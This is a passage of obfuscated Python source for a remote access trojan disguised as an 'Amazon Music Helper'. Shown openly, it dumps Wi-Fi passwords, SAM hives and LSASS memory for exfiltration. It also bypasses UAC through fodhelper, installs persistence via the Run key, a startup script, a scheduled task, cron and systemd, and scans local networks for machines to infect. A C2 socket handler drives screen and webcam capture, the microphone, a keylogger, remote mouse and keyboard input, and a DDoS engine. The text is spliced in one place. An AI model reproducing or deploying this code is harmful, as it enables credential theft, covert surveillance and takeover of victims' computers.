    ""_D("_s118")""
    try:
        if sys.platform == _D("_s119"):
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s120")
        else:
            subprocess.run([_D("_s121"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s122")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s123")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s124")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s125"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s126")""
    if sys.platform != _D("_s127"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s128") if block else "Input unblocked"
        return False, _D("_s129") if block else "Unblock failed"
    except Exception as e: return False, str(e)
_COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: _D("_s130"), 25: 'SMTP', 53: 'DNS',
    80: _D("_s131"), 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
    443: _D("_s132"), 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
    3306: _D("_s133"), 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
    6379: _D("_s134"), 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9090: 'Web-Alt',
    27017: _D("_s135"), 515: 'LPD/Printer', 631: 'IPP/Printer', 9100: 'JetDirect/Printer',
    548: 'AFP', 5000: _D("_s136"), 5353: 'mDNS', 7000: 'AirPlay',
    1900: _D("_s137"), 5357: 'WSD', 8000: 'HTTP-Alt', 8888: 'HTTP-Alt',
    8008: _D("_s138"), 8009: 'Chromecast', 554: 'RTSP',
}
_MAC_OUI = {
    _D("_s139"): 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link', 'A4:2B:B0': 'TP-Link',
    _D("_s140"): 'Synology', '00:25:90': 'Supermicro',
    _D("_s141"): 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP', '70:5A:0F': 'HP',
    _D("_s142"): 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
    _D("_s143"): 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell', 'F0:D5:BF': 'Dell',
    _D("_s144"): 'ASUS', '0C:9D:92': 'ASUS', 'E0:CB:4E': 'ASUS',
    _D("_s145"): 'Google', '54:60:09': 'Google',
    _D("_s146"): 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
    _D("_s147"): 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
    _D("_s148"): 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
    _D("_s149"): 'VMware', '08:00:27': 'VirtualBox',
    _D("_s150"): 'Canon', '00:26:73': 'RICOH', '00:1C:C4': 'Brother',
    _D("_s151"): 'Cisco-Linksys', '00:23:69': 'Cisco-Linksys',
    _D("_s152"): 'Microsoft', '00:15:5D': 'Microsoft',
    _D("_s153"): 'VMware', '00:1C:42': 'Parallels',
    _D("_s154"): 'Apple', 'A4:D1:D2': 'Apple',
    _D("_s155"): 'Apple', '00:25:BC': 'Apple',
    _D("_s156"): 'Samsung', 'CC:3A:61': 'Samsung',
    _D("_s157"): 'Sony', '00:0D:D0': 'Sony',
    _D("_s158"): 'Sony', 'BC:30:D9': 'Sony',
    _D("_s159"): 'Microsoft', '58:82:A8': 'Microsoft',
    _D("_s160"): 'QNAP', '00:08:9B': 'QNAP',
    _D("_s161"): 'Roku', 'B0:A7:37': 'Roku',
    _D("_s162"): 'Apple', '54:26:96': 'Apple',
}
def _classify_machine(ip, mac_vendor, open_ports):
    ""_D("_s163")""
    ports = set(open_ports)
    parts = ip.split('.')
    is_gw = len(parts) == 4 and int(parts[3]) in (1, 254)
    if is_gw:
        return _D("_s164"), '📡', 'Router / Gateway'
    has_windows = 445 in ports or 135 in ports or 139 in ports
    has_rdp = 3389 in ports
    has_ssh = 22 in ports
    has_web = 80 in ports or 443 in ports or 8080 in ports or 8443 in ports
    has_printer = 515 in ports or 631 in ports or 9100 in ports
    has_db = 3306 in ports or 5432 in ports or 27017 in ports or 6379 in ports
    has_nas = 548 in ports  
    has_upnp = 5000 in ports or 1900 in ports
    if has_printer:
        return _D("_s165"), '🖨️', 'Printer'
    if has_ssh and has_web:
        return _D("_s166"), '🐧', 'Linux Web Server'
    if has_ssh:
        return _D("_s167"), '🐧', 'Linux/Unix Server'
    if has_windows and has_rdp:
        return _D("_s168"), '🪟', 'Windows PC'
    if has_windows and has_web:
        if has_nas or mac_vendor.lower() in (_D("_s169"), 'qnap', 'western digital', 'seagate'):
            return 'nas', '🗄️', _D("_s170")
        return _D("_s171"), '🪟', 'Windows Server'
    if has_rdp:
        return _D("_s172"), '🪟', 'Windows PC (RDP)'
    if has_windows:
        return _D("_s173"), '🪟', 'Windows PC'
    if has_db:
        return _D("_s174"), '🗃️', 'Database Server'
    if has_web:
        if mac_vendor.lower() in (_D("_s175"), 'd-link', 'netgear', 'asus', 'cisco', 'linksys', 'belkin'):
            return _D("_s176"), '📡', 'Router / AP'
        return _D("_s177"), '🌐', 'Web Server'
    if has_upnp:
        return 'iot', '📱', _D("_s178")
    vendor_lower = mac_vendor.lower()
    if any(x in vendor_lower for x in (_D("_s179"), 'samsung', 'xiaomi', 'huawei', 'oneplus')):
        return _D("_s180"), '📱', 'Mobile Device'
    if any(x in vendor_lower for x in (_D("_s181"), 'amazon', 'nest', 'ring', 'arlo', 'wyze')):
        return 'iot', '🏠', _D("_s182")
    if any(x in vendor_lower for x in (_D("_s183"), 'arduino')):
        return _D("_s184"), '🥧', 'Embedded Linux'
    if any(x in vendor_lower for x in (_D("_s185"), 'lg', 'samsung', 'roku', 'vizio')):
        return 'iot', '📺', _D("_s186")
    if any(x in vendor_lower for x in ('hp', _D("_s187"), 'canon', 'epson', 'xerox')):
        return _D("_s188"), '🖨️', 'Printer'
    return _D("_s189"), '❓', 'Unknown Device'
def _scan_ports(ip, ports, timeout=0.4):
    ""_D("_s190")""
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                open_ports.append(port)
        except:
            pass
    return open_ports
def _network_info():
    ""_D("_s191")""
    info = {_D("_s192"): [], "connections": [], "arp": [], "local_network": [], "external_hosts": []}
    try:
        if HAS[_D("_s193")]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {_D("_s194"): name, "addresses": []}
                for addr in addrs:
                    iface[_D("_s195")].append({
                        _D("_s196"): str(addr.family),
                        _D("_s197"): addr.address,
                        _D("_s198"): addr.netmask or "",
                        _D("_s199"): addr.broadcast or ""
                    })
                info[_D("_s200")].append(iface)
    except Exception as e: info[_D("_s201")] = str(e)
    try:
        if HAS[_D("_s202")]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info[_D("_s203")].append({
                    "fd": conn.fd or -1,
                    _D("_s204"): str(conn.family),
                    _D("_s205"): str(conn.type),
                    _D("_s206"): f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    _D("_s207"): f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    _D("_s208"): conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info[_D("_s209")] = str(e)
    try:
        if sys.platform == _D("_s210"):
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == _D("_s211") else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and (_D("_s212") in line.lower() or "static" in line.lower()
                             or _D("_s213") in line.lower() or "statique" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), _D("_s214"): parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info[_D("_s215")] = str(e)
    port_list = sorted(_COMMON_PORTS.keys())
    for arp_entry in info["arp"]:
        if not isinstance(arp_entry, dict) or not arp_entry.get("ip"):
            continue
        ip = arp_entry["ip"]
        mac = arp_entry.get("mac", "")
        if ip.startswith(_D("_s216")) or ip.startswith("239.") or ip.startswith("255.") or ip == "0.0.0.0":
            continue
        mac_vendor = _D("_s217")
        if mac:
            parts_mac = mac.replace("-", ":").upper().split(":")
            if len(parts_mac) >= 3:
                oui = ":".join(parts_mac[:3])
                mac_vendor = _MAC_OUI.get(oui, _D("_s218"))
        open_ports = _scan_ports(ip, port_list)
        open_services = {p: _COMMON_PORTS[p] for p in open_ports}
        machine_type, icon, label = _classify_machine(ip, mac_vendor, open_ports)
        info[_D("_s219")].append({
            "ip": ip, "mac": mac,
            _D("_s220"): mac_vendor,
            _D("_s221"): open_ports,
            _D("_s222"): open_services,
            _D("_s223"): machine_type,
            _D("_s224"): label,
            _D("_s225"): icon,
            _D("_s226"): arp_entry.get("type", ""),
            _D("_s227"): "local"
        })
    seen_ext = set()
    for conn in info.get(_D("_s228"), []):
        remote = conn.get(_D("_s229"), "")
        if not remote or not isinstance(remote, str):
            continue
        parts = remote.rsplit(":", 1)
        if len(parts) != 2:
            continue
        ext_ip, ext_port = parts[0], parts[1]
        if ext_ip.startswith(_D("_s230")) or ext_ip.startswith("10.") or ext_ip.startswith("192.168.") or ext_ip.startswith("172."):
            if ext_ip.startswith(_D("_s231")):
                try:
                    second = int(ext_ip.split(".")[1])
                    if 16 <= second <= 31:
                        continue
                except:
                    continue
            else:
                continue
        if ext_ip in (_D("_s232"), "*", "::", "::1"):
            continue
        try:
            ext_port_int = int(ext_port)
        except:
            ext_port_int = 0
        svc = _COMMON_PORTS.get(ext_port_int, "")
        key = f"{ext_ip}:{ext_port}"
        if key in seen_ext:
            continue
        seen_ext.add(key)
        info[_D("_s233")].append({
            "ip": ext_ip,
            _D("_s234"): ext_port_int,
            _D("_s235"): svc,
            _D("_s236"): conn.get("status", ""),
            "pid": conn.get("pid", 0),
            _D("_s237"): conn.get("local", ""),
            _D("_s238"): "external"
        })
    ext_by_ip = {}
    for h in info[_D("_s239")]:
        ip = h["ip"]
        if ip not in ext_by_ip:
            ext_by_ip[ip] = dict(h)
            ext_by_ip[ip][_D("_s240")] = []
        ext_by_ip[ip][_D("_s241")].append({"port": h["port"], "service": h["service"]})
    info[_D("_s242")] = list(ext_by_ip.values())
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(2)  
    for h in info[_D("_s243")]:
        try:
            hostname = socket.gethostbyaddr(h["ip"])[0]
            h[_D("_s244")] = hostname
            has_https = any(p[_D("_s245")] == 443 for p in h.get("all_ports", []))
            has_http = any(p[_D("_s246")] == 80 or p["port"] == 8080 for p in h.get("all_ports", []))
            if has_https:
                h["url"] = f"https://{hostname}"
            elif has_http:
                h["url"] = f"http://{hostname}"
            else:
                h["url"] = hostname
        except:
            pass
    socket.setdefaulttimeout(old_timeout)
    return info
def _wifi_passwords():
    ""_D("_s247")""
    if sys.platform != _D("_s248"): return {"error": "Windows only"}
    profiles = []
    try:
        r = subprocess.run([_D("_s249"), "wlan", "show", "profiles"], capture_output=True, text=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.split("\n"):
            if ":" in line and _D("_s250") in line:
                name = line.split(":")[-1].strip()
                if name:
                    r2 = subprocess.run([_D("_s251"), "wlan", "show", "profile", f"name={name}", "key=clear"],
                                       capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    pwd = ""
                    for l in r2.stdout.split("\n"):
                        if "Cl" in l and (_D("_s252") in l.lower() or "key content" in l.lower()):
                            pwd = l.split(":")[-1].strip()
                    profiles.append({_D("_s253"): name, "password": pwd or "[OPEN/NONE]"})
    except Exception as e: return {_D("_s254"): str(e)}
    return {_D("_s255"): profiles, "count": len(profiles)}
def _sam_dump():
    ""_D("_s256")""
    if sys.platform != _D("_s257"): return {"error": "Windows only"}
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin: return {_D("_s258"): "Not admin - SAM dump requires elevation"}
        tmp = os.environ.get(_D("_s259"), "C:\\Windows\\Temp")
        sam_path = os.path.join(tmp, _D("_s260"))
        sys_path = os.path.join(tmp, _D("_s261"))
        subprocess.run(["reg", _D("_s262"), "HKLM\\SAM", sam_path, "/y"], capture_output=True,
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
        subprocess.run(["reg", _D("_s263"), "HKLM\\SYSTEM", sys_path, "/y"], capture_output=True,
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
        hashes = []
        if os.path.exists(sam_path) and os.path.exists(sys_path):
            try:
                sam_data = open(sam_path, "rb").read()
                users = set()
                for m in re.finditer(b_D("_s264"), sam_data):
                    u = m.group(0).decode(_D("_s265"), errors="ignore").strip()
                    if len(u) >= 3 and u.lower() not in (_D("_s266"), "guest", "defaultaccount",
                        _D("_s267"), "administrateur", "invit"):
                        if all(32 <= ord(c) < 127 for c in u):
                            users.add(u)
                hashes.append({_D("_s268"): "Administrator", "hash": "[SAM dumped - use impacket-secretsdump to extract]"})
                for u in sorted(users)[:20]:
                    hashes.append({_D("_s269"): u, "hash": "[in SAM dump]"})
            except Exception as e:
                hashes.append({_D("_s270"): f"Parse error: {e}"})
        for f in [sam_path, sys_path]:
            try: os.remove(f)
            except: pass
        return {_D("_s271"): True, "hashes": hashes[:50], "note": "SAM+SYSTEM saved to temp. Run secretsdump.py locally."}
    except Exception as e: return {_D("_s272"): str(e)}
def _lsass_dump():
    ""_D("_s273")""
    if sys.platform != _D("_s274"): return {"error": "Windows only"}
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin: return {_D("_s275"): "Not admin - LSASS dump requires elevation"}
        r = subprocess.run([_D("_s276"), "/fi", "IMAGENAME eq lsass.exe", "/fo", "csv", "/nh"],
                          capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        pid = None
        for line in r.stdout.split("\n"):
            parts = line.replace('"','').split(",")
            if len(parts) >= 2 and _D("_s277") in parts[0].lower():
                try: pid = int(parts[1].strip())
                except: pass
                break
        if not pid: return {_D("_s278"): "LSASS process not found"}
        tmp = os.environ.get(_D("_s279"), "C:\\Windows\\Temp")
        dump_path = os.path.join(tmp, f"lsass_{random.randint(1000,9999)}.dmp")
        cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {pid} "{dump_path}" full'
        subprocess.run(cmd, shell=True, capture_output=True,
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        if os.path.exists(dump_path) and os.path.getsize(dump_path) > 10000:
            save_dir = _pdir()
            save_path = os.path.join(save_dir, f"lsass_{random.randint(1000,9999)}.dmp")
            try:
                shutil.move(dump_path, save_path)
                _l.info(f"LSASS dump saved: {save_path} ({round(os.path.getsize(save_path)/(1024*1024),2)} MB)")
            except:
                save_path = dump_path  
            return {_D("_s280"): True, "method": "comsvcs.dll MiniDump", "lsass_pid": pid,
                    _D("_s281"): round(os.path.getsize(save_path)/(1024*1024), 2),
                    _D("_s282"): save_path,
                    _D("_s283"): "LSASS dump saved locally. Use file download to exfiltrate, then mimikatz/pypykatz to extract creds."}
        return {_D("_s284"): f"Dump failed - file size: {os.path.getsize(dump_path) if os.path.exists(dump_path) else 0} bytes"}
    except Exception as e: return {_D("_s285"): str(e)}
def _cached_credentials():
    ""_D("_s286")""
    if sys.platform != _D("_s287"): return {"error": "Windows only"}
    creds = {_D("_s288"): [], "vault": [], "rdp": []}
    try:
        r = subprocess.run([_D("_s289"), "/list"], capture_output=True, text=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.split("\n"):
            line = line.strip()
            if _D("_s290") in line or "Target" in line:
                target = line.split(":")[-1].strip() if ":" in line else line
                creds[_D("_s291")].append({"target": target, "type": "domain" if "Domain" in r.stdout else "generic"})
    except: pass
    try:
        r = subprocess.run([_D("_s292"), "/list:TERMSRV"], capture_output=True, text=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        for line in r.stdout.split("\n"):
            if _D("_s293") in line or "Target" in line:
                creds["rdp"].append(line.split(":")[-1].strip() if ":" in line else line.strip())
    except: pass
    try:
        r = subprocess.run([_D("_s294"), "/listcreds:""Windows CredentialsScan network for Windows machines (port 445 open) that can be infected.
    If subnets is provided (list of _D("_s303") strings), uses those instead of local discovery.Connect to a WiFi network, scan it, infect discovered machines.
    Runs in a subprocess to survive C2 disconnect during WiFi switch.Silent UAC bypass using fodhelper.exe (Windows 10/11).
    Creates registry keys, launches fodhelper, and exits current process.
    The elevated instance will clean up and resume."""
    if sys.platform != _D("_s484"):
        _l.warning(_D("_s485"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s486"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s487"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s488"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s489"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s490"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s491"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s492"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s493"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s494")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s495"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s496"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s497")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s498")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s499"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s500"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s501"):
        b = os.environ.get(_D("_s502"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s503"))
    else:
        p = os.path.expanduser(_D("_s504"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s505") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s506"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s507"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s508"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s509"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s510"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s511"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s512")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s513"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s514"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s515")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s516"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s517") not in ct:
                ct += f"\n
                subprocess.run([_D("_s518"),"-"], input=ct, text=True)
                _l.info(_D("_s519")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s520")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s521")), "w") as f: f.write(sc)
            subprocess.run([_D("_s522"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s523"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s524")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s525"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s526")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s527"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s528"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s529"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s530") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s531") not in l)
                subprocess.run([_D("_s532"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s533"))
            if os.path.exists(sp):
                subprocess.run([_D("_s534"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s535"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s536"))
    wc = CapEngine(sio, _D("_s537"))
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    global ddos
    ddos = DdosEngine(sio)
    _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
    @sio.on(_D("_s538"))
    def _c():
        _l.info(_D("_s539")); _s.conn = True
        sio.emit(_D("_s540"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s541"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s542"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s543"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s544"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s545"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s546")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
    @sio.on(_D("_s547"))
    def _r(d):
        _s.reg = True; _s.cid = d.get(_D("_s548"), _s.cid); _l.info(f"Registered: {_s.cid}")
        def _report_saved():
            try:
                save_dir = _pdir()
                for fname in os.listdir(save_dir):
                    if fname.startswith(_D("_s549")) and fname.endswith(".json"):
                        try:
                            with open(os.path.join(save_dir, fname), "r") as fp:
                                data = json.load(fp)
                            sio.emit(_D("_s550"), data)
                            os.remove(os.path.join(save_dir, fname))
                        except: pass
            except: pass
        threading.Thread(target=_report_saved, daemon=True).start()
    @sio.on(_D("_s551"))
    def _sc(d=None):
        if d and _D("_s552") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s553"), {"active": True})
    @sio.on(_D("_s554"))
    def _sc2(): sc.stop(); sio.emit(_D("_s555"), {"active": False})
    @sio.on(_D("_s556"))
    def _smn(d):
        if d and _D("_s557") in d:
            sc.monitor_idx = int(d[_D("_s558")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s559"), {"active": True})
    @sio.on(_D("_s560"))
    def _sq(d):
        if d:
            if _D("_s561") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s562") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s563"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s564"), {"active": True})
    @sio.on(_D("_s565"))
    def _wc2(): wc.stop(); sio.emit(_D("_s566"), {"active": False})
    @sio.on(_D("_s567"))
    def _wq(d):
        if d:
            if _D("_s568") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s569"))
    def _mstart(d=None): mic.start()
    @sio.on(_D("_s570"))
    def _mstop(): mic.stop(); sio.emit(_D("_s571"), {"active": False})
    @sio.on(_D("_s572"))
    def _kstart(d=None): keylog.start()
    @sio.on(_D("_s573"))
    def _kstop(): keylog.stop()
    @sio.on(_D("_s574"))
    def _me(d):
        if not HAS[_D("_s575")] or not _s.mc: return
        try:
            a = d.get(_D("_s576"),"")
            if a == _D("_s577"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s578"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s579"):
                bm = {_D("_s580"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s581"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s582"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s583"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s584"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s585"))
    def _ke(d):
        if not HAS[_D("_s586")] or not _s.kc: return
        try:
            SP = {_D("_s587"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s588"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s589"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s590"): Key.down, "left": Key.left, "right": Key.right,
